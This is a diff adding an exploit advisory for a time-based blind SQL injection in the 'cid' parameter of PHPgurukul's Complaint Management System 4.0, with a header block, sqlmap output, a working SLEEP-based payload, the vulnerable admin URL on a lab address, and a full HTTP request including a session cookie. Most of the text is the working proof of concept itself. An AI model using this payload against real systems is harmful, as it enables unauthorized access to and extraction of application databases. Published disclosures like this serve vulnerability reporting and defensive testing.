@@ -1,0 +1,45 @@
+# Exploit Title: Complaint Management System 4.0 - 'cid' SQL injection
+# Google Dork: N/A
+# Date: 2020-01-03
+# Exploit Author: FULLSHADE
+# Vendor Homepage: https://phpgurukul.com
+# Software Link: https://phpgurukul.com/complaint-management-sytem/
+# Version: v4.0
+# Tested on: Windows 7
+# CVE : N/A
+
+Description:
+
+The Complaint Management System v4.0 application from PHPgurukul is vulnerable to
+blind SQL injection via the 'cid' parameter which is found on the complaint-details.php
+page.
+
+========== 1. SQLi ==========
+
+SQLMAP POC:
+
+GET parameter 'cid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+sqlmap identified the following injection point(s) with a total of 1748 HTTP(s) requests:
+---
+Parameter: cid (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: cid=2'+(SELECT 0x7648556f WHERE 4476=4476 AND SLEEP(5))+'
+---
+
+The ?cid parameter is vulnerable to sql injection within the
+
+the vulnerable URL = https://10.0.0.214/complaint%20management%20system/cms/admin/complaint-details.php?cid=2
+
+request:
+
+GET /complaint%20management%20system/cms/admin/complaint-details.php?cid=2 HTTP/1.1
+Host: 10.0.0.214
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Cookie: PHPSESSID=5bmri9rlp1jvrjkhgumn7v9fot
+Upgrade-Insecure-Requests: 1
